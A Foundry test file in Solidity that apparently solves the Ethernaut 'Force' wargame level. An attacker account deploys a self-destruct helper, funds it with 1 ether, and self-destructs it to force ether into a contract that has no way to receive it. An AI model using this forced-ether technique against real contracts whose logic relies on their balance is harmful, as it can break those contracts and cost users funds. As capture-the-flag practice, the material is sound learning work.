// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Force } from "../../src/Force/Force.sol";
import { SelfDestruct } from "./SelfDestruct.sol";

contract ForceTest is Test {
    Force force;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        force = new Force();
        deal(h3x0r, 1 ether);
    }

    function testForceHack() public {
        vm.startPrank(h3x0r);
        SelfDestruct selfDestruct = new SelfDestruct();
        (bool sent, ) = address(selfDestruct)
            .call{value: 1 ether}("");

        assertEq(address(selfDestruct).balance, 1 ether);

        selfDestruct.suicideSend(address(force));
        assertEq(address(force).balance, 1 ether);
    }
}